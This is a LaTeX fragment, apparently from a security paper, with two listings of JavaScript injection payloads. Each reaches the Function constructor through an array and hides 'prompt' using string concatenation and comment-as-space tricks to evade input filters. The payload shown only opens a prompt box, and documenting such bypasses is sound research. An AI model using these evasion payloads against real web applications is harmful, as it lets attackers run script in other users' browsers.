...
\begin{lstlisting}[style=basicStyle, language=Python, caption=function constructor + string concatenation bypass in square bracket notation, label={lst:funconbypasssbn}]
[]['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
\end{lstlisting}
...
\begin{lstlisting}[style=basicStyle, caption=function constructor + string concatenation bypass in dot notation, language=Python]
[].constructor.constructor(`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
\end{lstlisting}
